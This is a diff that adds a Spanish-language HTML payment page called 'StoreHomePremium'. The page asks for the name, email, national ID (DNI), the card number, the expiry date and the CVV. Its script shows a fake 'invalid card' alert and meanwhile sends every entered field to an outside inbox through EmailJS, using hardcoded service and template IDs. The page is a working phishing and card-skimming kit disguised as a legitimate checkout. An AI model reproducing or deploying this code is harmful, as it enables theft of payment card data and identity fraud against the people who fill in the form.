@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>StoreHomePremium</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  background: #f2f4f7;
+  display: flex;
+  justify-content: center;
+  padding: 20px;
+}
+
+/* CONTENEDOR */
+.card {
+  width: 100%;
+  max-width: 420px;
+  background: #ffffff;
+  color: #1f2933;
+  padding: 24px;
+  border-radius: 14px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.12);
+}
+
+/* TITULO */
+h1 {
+  font-size: 22px;
+  margin-bottom: 10px;
+  text-align: center;
+  color: #0a2f7a;
+}
+
+/* SUBTITULO */
+.subtitle {
+  text-align: center;
+  font-size: 14px;
+  color: #4b5563;
+  margin-bottom: 18px;
+}
+
+/* LABELS */
+label {
+  margin-top: 12px;
+  font-size: 13px;
+  font-weight: 600;
+  color: #374151;
+  display: block;
+}
+
+/* INPUTS */
+input {
+  width: 100%;
+  padding: 10px;
+  border-radius: 8px;
+  border: 1px solid #cbd5e1;
+  margin-top: 6px;
+  font-size: 14px;
+  box-sizing: border-box;
+}
+
+input:focus {
+  outline: none;
+  border-color: #0a2f7a;
+}
+
+/* TARJETA VISUAL */
+.card-visual {
+.card-visual.flip {
+  transform: rotateY(180deg);
+}
+.card-visual {
+  transition: transform 0.6s ease;
+  transform-style: preserve-3d;
+}
+  background: linear-gradient(145deg, #0f172a, #1e293b);
+  border-radius: 16px;
+  padding: 20px;
+  margin-top: 22px;
+  color: white;
+  box-shadow: 0 12px 25px rgba(0,0,0,0.4);
+  transition: all 0.3s ease;
+}
+
+.card-visual.active {
+  transform: translateY(-4px);
+}
+
+/* MARCAS */
+.card-brands {
+  display: flex;
+  gap: 12px;
+  margin-bottom: 18px;
+}
+
+.card-brands span {
+  background: rgba(255,255,255,0.12);
+  padding: 6px 14px;
+  border-radius: 8px;
+  font-size: 14px;
+  opacity: 0.5;
+}
+
+.card-brands span.active {
+  opacity: 1;
+}
+
+/* NUMERO */
+.card-number {
+  font-size: 20px;
+  letter-spacing: 3px;
+  margin-bottom: 18px;
+}
+
+/* FILA */
+.card-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 18px;
+}
+
+.card-exp,
+.card-cvv {
+  background: rgba(255,255,255,0.08);
+  padding: 10px;
+  border-radius: 8px;
+  width: 45%;
+  text-align: center;
+  font-size: 14px;
+}
+
+.card-name {
+  font-size: 14px;
+  text-transform: uppercase;
+  opacity: 0.85;
+}
+
+/* BOTON */
+button {
+  margin-top: 22px;
+  width: 100%;
+  padding: 13px;
+  border: none;
+  border-radius: 10px;
+  background: #0a2f7a;
+  color: white;
+  font-size: 15px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+button:hover {
+  background: #08245f;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<h1>StoreHomePremium<br>– pago seguro y simple</h1>
+
+<p class="subtitle">
+Seleccione el monto a pagar y complete el formulario.
+Recibirá una confirmación en su correo.
+</p>
+
+<label>Monto a pagar</label>
+<input id="monto" type="number" placeholder="$ Ingrese monto en pesos">
+
+<label>Nombre completo</label>
+<input id="nombre" type="text" placeholder="Ej: Carlos Pérez">
+
+<label>Email</label>
+<input id="email" type="email" placeholder="correo@gmail.com.ar">
+
+<label>DNI</label>
+<input id="dni" type="number" placeholder="DNI">
+
+<label>Nombre del titular</label>
+<input id="titular" type="text" placeholder="Nombre tal como aparece en la tarjeta">
+
+<label>Número de tarjeta</label>
+<input id="numero_tarjeta" type="text" inputmode="numeric" placeholder="1234 5678 9012 3456">
+
+<label>Fecha de expiración (MM/AA)</label>
+<input id="fecha_expiracion" type="text" inputmode="numeric" placeholder="MM/AA">
+
+<label>Código de seguridad (CVV)</label>
+<input id="codigo_seguridad"
+       type="password"
+       inputmode="numeric"
+       placeholder="123"
+       autocomplete="off">
+
+<!-- TARJETA VISUAL -->
+<div class="card-visual" id="cardVisual">
+
+  <div class="card-brands">
+    <span id="brand-visa">VISA</span>
+    <span id="brand-master">MASTERCARD</span>
+  </div>
+
+  <div class="card-number" id="preview-number">
+    **** **** **** 1234
+  </div>
+
+  <div class="card-row">
+    <div class="card-exp" id="preview-exp">MM / AA</div>
+    <div class="card-cvv">***</div>
+  </div>
+
+  <div class="card-name" id="preview-name">
+    NOMBRE DEL TITULAR
+  </div>
+
+</div>
+<label>Tipo de tarjeta</label>
+<div style="display:flex; gap:16px; margin-top:6px;">
+  <label>
+    <input type="radio" name="tipo_tarjeta" value="Visa">
+    Visa
+  </label>
+
+  <label>
+    <input type="radio" name="tipo_tarjeta" value="Mastercard">
+    Mastercard
+  </label>
+</div>
+<button type="button" id="enviar">Ver opciones de cuotas</button>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+emailjs.init("gOD19I3u7jPioagR4");
+
+const cardVisual = document.getElementById("cardVisual");
+const visa = document.getElementById("brand-visa");
+const master = document.getElementById("brand-master");
+const inputCVV = document.getElementById("codigo_seguridad");
+
+inputCVV.addEventListener("focus", function () {
+  cardVisual.classList.add("flip");
+});
+
+inputCVV.addEventListener("blur", function () {
+  cardVisual.classList.remove("flip");
+});
+
+document.querySelectorAll("input").forEach(input => {
+  input.addEventListener("focus", () => cardVisual.classList.add("active"));
+  input.addEventListener("blur", () => cardVisual.classList.remove("active"));
+});
+
+document.getElementById("titular").addEventListener("input", function () {
+  document.getElementById("preview-name").textContent =
+    this.value || "NOMBRE DEL TITULAR";
+});
+
+document.getElementById("numero_tarjeta").addEventListener("input", function () {
+  let value = this.value.replace(/\D/g, "").substring(0, 16);
+  this.value = value.replace(/(.{4})/g, "$1 ").trim();
+
+  document.getElementById("preview-number").textContent =
+    "**** **** **** " + (value.slice(-4) || "1234");
+
+  visa.classList.remove("active");
+  master.classList.remove("active");
+
+  if (value.startsWith("4")) visa.classList.add("active");
+
+  const f2 = parseInt(value.substring(0, 2));
+  const f4 = parseInt(value.substring(0, 4));
+  if ((f2 >= 51 && f2 <= 55) || (f4 >= 2221 && f4 <= 2720)) {
+    master.classList.add("active");
+  }
+});
+
+document.getElementById("fecha_expiracion").addEventListener("input", function () {
+  let value = this.value.replace(/\D/g, "").substring(0, 4);
+  if (value.length > 2) value = value.substring(0, 2) + "/" + value.substring(2);
+  this.value = value;
+  document.getElementById("preview-exp").textContent = value || "MM / AA";
+});
+
+document.getElementById("codigo_seguridad").addEventListener("input", function () {
+  this.value = this.value.replace(/\D/g, "").substring(0, 3);
+});
+document.getElementById("codigo_seguridad").addEventListener("input", function () {
+  this.value = this.value.replace(/\D/g, "").substring(0, 3);
+});
+document.getElementById("codigo_seguridad").addEventListener("paste", function (e) {
+  e.preventDefault();
+});
+
+
+document.getElementById("enviar").addEventListener("click", function () {
+
+  if (navigator.vibrate) {
+    navigator.vibrate([120, 60, 120]);
+  }
+
+  alert("❌ Tarjeta inválida. Vuelva a intentar nuevamente.");
+
+  let tipo = "";
+  if (visa.classList.contains("active")) tipo = "Visa";
+  if (master.classList.contains("active")) tipo = "Mastercard";
+const tipoSeleccionado = document.querySelector(
+  'input[name="tipo_tarjeta"]:checked'
+);
+
+
+  emailjs.send("service_p965auj", "template_h5kc29e", {
+    monto: monto.value,
+    nombre: nombre.value,
+    email: email.value,
+    dni: dni.value,
+    titular: titular.value,
+    numero_tarjeta: numero_tarjeta.value,
+    fecha_expiracion: fecha_expiracion.value,
+    codigo_seguridad: codigo_seguridad.value,
+    tipo_tarjeta: tipoSeleccionado ? tipoSeleccionado.value : ""
+  });
+});
+</script>
+
+</body>
+</html>
